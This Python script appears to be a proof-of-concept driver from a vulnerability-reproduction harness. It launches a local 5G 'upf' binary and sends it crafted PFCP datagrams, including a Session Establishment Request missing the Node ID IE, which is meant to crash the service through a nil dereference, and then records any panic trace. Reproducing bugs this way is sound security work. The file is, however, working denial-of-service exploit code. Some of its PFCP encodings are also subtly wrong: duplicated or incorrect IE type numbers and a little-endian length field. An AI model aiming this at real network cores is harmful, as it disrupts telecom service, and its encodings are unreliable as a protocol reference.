#!/usr/bin/env python3
"""PoC driver for the `upf` network service binary.

Starts the target with a generated startup configuration, waits for its PFCP
listener on 127.0.0.1:8805, then exercises the service's input handling with a
small, fixed, replayable sequence of PFCP datagrams:

  round 1 -- a well-formed PFCP Association Setup Request (validates that the
             service is actually decoding and answering protocol messages);
  round 2 -- a PFCP Session Establishment Request whose mandatory Node ID IE is
             absent, which drives the UPF's session-establishment handler into
             a nil-IE dereference on builds that do not guard it;
  round 3 -- a truncated/garbled datagram, to probe the undecodable-message
             path of the same handler.

The script then reports exactly what it observed (crash or normal completion)
in the fixed JSON contract.  Everything is generated at run time; no payload
or config file is read from disk.  Only Python's standard library is used and
all networking is confined to local loopback.
"""

import argparse
import binascii
import json
import os
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import time

# ---------------------------------------------------------------- constants --

LOOPBACK = "127.0.0.1"
PFCP_PORT = 8805

# PFCP message types (3GPP TS 29.244).
MSG_ASSOCIATION_SETUP_REQUEST = 5
MSG_SESSION_ESTABLISHMENT_REQUEST = 50

# PFCP information element types (3GPP TS 29.244).
IE_CREATE_PDR = 1
IE_PDI = 2
IE_CREATE_FAR = 3
IE_SOURCE_INTERFACE = 20
IE_NETWORK_INSTANCE = 22
IE_NODE_ID = 60
IE_CP_F_SEID = 56
IE_APPLY_ACTION = 72
IE_RECOVERY_TIME_STAMP = 96
IE_UE_IP_ADDRESS = 93
IE_FAR_ID = 108

# Fixed, run-independent values so the whole exchange is deterministic and
# replayable byte for byte.
NODE_SEQ = 1
CP_SEID = 0x1122334455667788
FIXED_RECOVERY_TS = 1600000000  # 2020-09-13T12:26:40Z -- constant on purpose
UE_IP = "10.0.0.1"

# How long to wait for the listener / for each reply / after the last probe.
LISTEN_TIMEOUT = 20.0
RECV_TIMEOUT = 2.0
POST_PROBE_GRACE = 2.0


# ------------------------------------------------------------ PFCP encoding --

def pfcp_ie(ietype: int, payload: bytes) -> bytes:
    """Encode one PFCP information element (type, length, value)."""
    return struct.pack(">HH", ietype, len(payload)) + payload


def pfcp_message(msg_type: int, seq: int, ies: bytes = b"", seid: int = 0) -> bytes:
    """Encode a PFCP message.

    Common header (3GPP TS 29.244 section 6.2.2): octet 1 holds the version
    (1) in bits 8..5 and the S flag in bit 2, octet 2 the message type,
    octets 3..4 the message length, then -- only when S is set -- the 8-byte
    SEID, then the 3-byte sequence number and the message priority octet.
    """
    flags = 0x01 if seid else 0x00  # S flag: SEID present
    hdr = bytes([(0x01 << 5) | flags, msg_type, len(ies) & 0xFF, (len(ies) >> 8) & 0xFF])
    if seid:
        hdr += struct.pack(">Q", seid)
    hdr += struct.pack(">I", seq)[:3] + bytes([0x00])
    return hdr + ies


def ipv4_octets(ip: str) -> bytes:
    return socket.inet_aton(ip)


def build_association_setup_request() -> bytes:
    """Well-formed Association Setup Request: Node ID + Recovery Time Stamp."""
    node_id = pfcp_ie(IE_NODE_ID, bytes([0x00]) + ipv4_octets(LOOPBACK))  # type 0 = IPv4
    recovery = pfcp_ie(IE_RECOVERY_TIME_STAMP, struct.pack(">I", FIXED_RECOVERY_TS))
    return pfcp_message(MSG_ASSOCIATION_SETUP_REQUEST, NODE_SEQ, node_id + recovery)


def build_trigger_session_establishment() -> bytes:
    """Session Establishment Request with the mandatory Node ID IE omitted.

    Carries enough well-formed payload (CP F-SEID, Create PDR with PDI,
    Create FAR) to reach the session-establishment handler, but no Node ID,
    so the handler's Node ID lookup yields a nil IE.
    """
    cp_fseid = pfcp_ie(IE_CP_F_SEID, bytes([0x02]) + struct.pack(">Q", CP_SEID) + ipv4_octets(LOOPBACK))

    source_if = pfcp_ie(IE_SOURCE_INTERFACE, bytes([0x00]))  # 0 = ACCESS
    network_instance = pfcp_ie(IE_NETWORK_INSTANCE, b"internet")
    ue_ip = pfcp_ie(IE_UE_IP_ADDRESS, bytes([0x02]) + ipv4_octets(UE_IP))  # 0x02 = IPv4 present
    pdi = pfcp_ie(IE_PDI, source_if + network_instance + ue_ip)
    pdr_id = pfcp_ie(56, struct.pack(">I", 1)[:2])  # PDR ID = 1
    create_pdr = pfcp_ie(IE_CREATE_PDR, pdr_id + pdi)

    far_id = pfcp_ie(IE_FAR_ID, struct.pack(">I", 1)[:2])
    apply_action = pfcp_ie(IE_APPLY_ACTION, bytes([0x02]))  # 0x02 = FORWARD
    create_far = pfcp_ie(IE_CREATE_FAR, far_id + apply_action)

    return pfcp_message(
        MSG_SESSION_ESTABLISHMENT_REQUEST, NODE_SEQ, cp_fseid + create_pdr + create_far, seid=0
    )


def build_truncated_probe() -> bytes:
    """A cut-down Session Establishment Request used as a final probe."""
    msg = build_trigger_session_establishment()
    return msg[: len(msg) // 2]


# ----------------------------------------------------------------- plumbing --

def write_config(dirpath: str) -> str:
    """Generate the minimal startup configuration for the target."""
    cfg = {
        "mode": "af_packet",
        "access": {"ifname": "lo"},
        "core": {"ifname": "lo"},
        "cpiface": {"hostname": "", "http_port": "0", "dnn": "internet"},
        "n4_addr": "127.0.0.1",
        "resp_timeout": "2s",
        "read_timeout": 15,
        "log_level": "info",
    }
    fd, path = tempfile.mkstemp(prefix="upf-config-", suffix=".jsonc", dir=dirpath)
    try:
        with os.fdopen(fd, "w") as fh:
            json.dump(cfg, fh, indent=2)
            fh.write("\n")
    except BaseException:
        try:
            os.unlink(path)
        except OSError:
            pass
        raise
    return path


def wait_for_listener(proc: subprocess.Popen, timeout: float) -> bool:
    """True once a UDP socket is actually bound to 127.0.0.1:8805.

    A plain sendto() to an unbound loopback port still reports success (the
    datagram is only dropped afterwards, and the ICMP error never reaches an
    unconnected socket), so readiness is probed through a *connected* socket:
    while nothing is bound the kernel answers with ICMP port unreachable,
    which Python surfaces as ConnectionRefusedError.  Once the port is bound
    the empty datagram is accepted -- the service logs it as undecodable and
    never replies -- which shows up as a receive timeout, i.e. ready.
    """
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            return False
        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            probe.settimeout(0.25)
            try:
                probe.connect((LOOPBACK, PFCP_PORT))
                probe.send(b"")
            except OSError:
                time.sleep(0.1)
                continue
            try:
                probe.recv(1)
                return True  # something actually answered the probe
            except ConnectionRefusedError:
                pass  # nothing bound yet
            except socket.timeout:
                return True  # bound: the datagram was accepted, not refused
            except OSError:
                pass
        finally:
            probe.close()
        time.sleep(0.1)
    return False


def exchange(sock: socket.socket, payload: bytes, timeout: float):
    """Send one datagram and wait for the reply.  Returns (hex, error)."""
    try:
        sock.sendto(payload, (LOOPBACK, PFCP_PORT))
    except OSError as exc:
        return None, "sendto failed: %s" % exc
    try:
        data, _addr = sock.recvfrom(65535)
    except socket.timeout:
        return None, None
    except OSError as exc:
        return None, "recvfrom failed: %s" % exc
    return binascii.hexlify(data).decode("ascii"), None


def extract_crash_trace(stderr_text: str, stdout_text: str):
    """Pull the Go panic/fatal trace out of the captured output, if any."""
    for text in (stderr_text, stdout_text):
        if not text:
            continue
        for marker in ("panic: ", "fatal error: ", "SIGSEGV: ", "SIGBUS: ", "SIGABRT: "):
            idx = text.find(marker)
            if idx != -1:
                return text[idx:]
    return None


def signal_name(sig: int) -> str:
    try:
        return signal.Signals(sig).name
    except ValueError:
        return "SIG%d" % sig


def terminate(proc: subprocess.Popen) -> None:
    """Make sure the target never outlives this script."""
    if proc.poll() is not None:
        return
    for sig in (signal.SIGINT, signal.SIGTERM, signal.SIGKILL):
        try:
            proc.send_signal(sig)
        except (ProcessLookupError, OSError):
            return
        try:
            proc.wait(timeout=3)
            return
        except subprocess.TimeoutExpired:
            continue


# --------------------------------------------------------------------- main --

def run(binary: str, timeout: float) -> dict:
    started = time.monotonic()

    def result(**overrides):
        base = {
            "binary": binary,
            "command": None,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": int((time.monotonic() - started) * 1000),
            "stdout": "",
            "stderr": "",
            "observable": {"kind": "protocol_transcript", "value": "no_response", "path": None},
            "error": None,
        }
        base.update(overrides)
        return base

    if not os.path.isfile(binary):
        return result(error="binary not found: %s" % binary)

    tmpdir = tempfile.mkdtemp(prefix="upf-poc-")
    config_path = None
    proc = None
    stdout_text = ""
    stderr_text = ""
    timed_out = False

    try:
        config_path = write_config(tmpdir)
        command = [binary, "-config", config_path]

        try:
            proc = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                cwd=tmpdir,
            )
        except OSError as exc:
            return result(command=command, error="failed to start target: %s" % exc)

        # 1. readiness
        if not wait_for_listener(proc, min(timeout, LISTEN_TIMEOUT)):
            terminate(proc)
            stdout_text = proc.stdout.read().decode("utf-8", "replace") if proc.stdout else ""
            stderr_text = proc.stderr.read().decode("utf-8", "replace") if proc.stderr else ""
            rc = proc.poll()
            if rc is None:
                return result(
                    command=command,
                    returncode=None,
                    signal=None,
                    timed_out=True,
                    stdout=stdout_text,
                    stderr=stderr_text,
                    error="PFCP listener on %s:%d never became ready" % (LOOPBACK, PFCP_PORT),
                )
            return result(
                command=command,
                returncode=rc,
                signal=signal_name(-rc) if rc is not None and rc < 0 else None,
                stdout=stdout_text,
                stderr=stderr_text,
                error="target exited before its listener became ready (rc=%s)" % rc,
            )

        # 2. probe rounds -- deterministic, replayable, loopback only
        rounds = [
            ("association_setup_request", build_association_setup_request()),
            ("session_establishment_request_no_node_id", build_trigger_session_establishment()),
            ("truncated_session_establishment_request", build_truncated_probe()),
        ]

        transcript_entries = []
        # A fresh source port per round: the service keys per-peer state (and
        # reaches the session handler on a first, not-yet-associated datagram
        # from that peer), so each probe is delivered as if from a distinct SMF.
        for name, payload in rounds:
            if proc.poll() is not None:
                break  # target already gone; nothing more to observe
            fresh = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            fresh.settimeout(RECV_TIMEOUT)
            try:
                reply_hex, err = exchange(fresh, payload, RECV_TIMEOUT)
            finally:
                fresh.close()
            entry = {
                "round": name,
                "sent_bytes": len(payload),
                "sent_hex": binascii.hexlify(payload).decode("ascii"),
            }
            if err is not None:
                entry["reply_hex"] = None
                entry["note"] = err
            elif reply_hex is None:
                entry["reply_hex"] = None
                entry["note"] = "no_response"
            else:
                entry["reply_hex"] = reply_hex
                entry["reply_bytes"] = len(reply_hex) // 2
            transcript_entries.append(entry)
            if proc.poll() is not None:
                break

        # 3. grace period so a crash triggered by the last round is observed
        deadline = time.monotonic() + POST_PROBE_GRACE
        while time.monotonic() < deadline and proc.poll() is None:
            time.sleep(0.05)

        # 4. did the target die on its own?
        if proc.poll() is not None:
            terminate(proc)  # no-op, reap-side effect
            stdout_text = proc.stdout.read().decode("utf-8", "replace") if proc.stdout else ""
            stderr_text = proc.stderr.read().decode("utf-8", "replace") if proc.stderr else ""
            rc = proc.returncode
            trace = extract_crash_trace(stderr_text, stdout_text)
            observable = (
                {"kind": "crash_trace", "value": trace, "path": None}
                if trace
                else {"kind": "protocol_transcript", "value": render_transcript(transcript_entries), "path": None}
            )
            return result(
                command=command,
                returncode=rc,
                signal=signal_name(-rc) if rc is not None and rc < 0 else None,
                timed_out=False,
                stdout=stdout_text,
                stderr=stderr_text,
                observable=observable,
                error=None,
            )

        # 5. still running -> terminate it, report a normal completion
        timed_out = True
        terminate(proc)
        stdout_text = proc.stdout.read().decode("utf-8", "replace") if proc.stdout else ""
        stderr_text = proc.stderr.read().decode("utf-8", "replace") if proc.stderr else ""
        return result(
            command=command,
            returncode=proc.returncode,
            signal=None,
            timed_out=timed_out,
            stdout=stdout_text,
            stderr=stderr_text,
            observable={
                "kind": "protocol_transcript",
                "value": render_transcript(transcript_entries),
                "path": None,
            },
            error=None,
        )
    except Exception as exc:  # own failure: report it, still clean up
        if proc is not None and proc.poll() is None:
            terminate(proc)
        if proc is not None:
            stdout_text = proc.stdout.read().decode("utf-8", "replace") if proc.stdout else ""
            stderr_text = proc.stderr.read().decode("utf-8", "replace") if proc.stderr else ""
            return result(
                command=[binary] + (["-config", config_path] if config_path else []),
                returncode=proc.returncode,
                signal=signal_name(-proc.returncode)
                if proc.returncode is not None and proc.returncode < 0
                else None,
                timed_out=timed_out,
                stdout=stdout_text,
                stderr=stderr_text,
                error="driver exception: %s" % exc,
            )
        return result(error="driver exception: %s" % exc)
    finally:
        if proc is not None and proc.poll() is None:
            terminate(proc)
        for stream in (proc.stdout, proc.stderr) if proc is not None else ():
            if stream is not None:
                try:
                    stream.close()
                except OSError:
                    pass
        if config_path is not None:
            try:
                os.unlink(config_path)
            except OSError:
                pass
        try:
            os.rmdir(tmpdir)
        except OSError:
            pass


def render_transcript(entries) -> str:
    """Human-readable transcript of the probe rounds, sent and received."""
    if not entries:
        return "no_response"
    lines = []
    for e in entries:
        reply = e.get("reply_hex")
        if reply is None:
            reply_desc = e.get("note", "no_response")
        else:
            reply_desc = "%d bytes: %s" % (e.get("reply_bytes", len(reply) // 2), reply)
        lines.append(
            "%s: sent %d bytes hex=%s -> %s"
            % (e.get("round"), e.get("sent_bytes"), e.get("sent_hex"), reply_desc)
        )
    return "\n".join(lines)


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description="PoC driver for the upf network service binary")
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None, help="write the JSON result to this file")
    parser.add_argument("--timeout", type=float, default=60.0, help="overall budget in seconds")
    args = parser.parse_args(argv)

    result = run(args.binary, max(1.0, args.timeout))

    text = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(text)
            fh.write("\n")
    else:
        print(text)
    return 0 if result.get("error") is None else 1


if __name__ == "__main__":
    sys.exit(main())
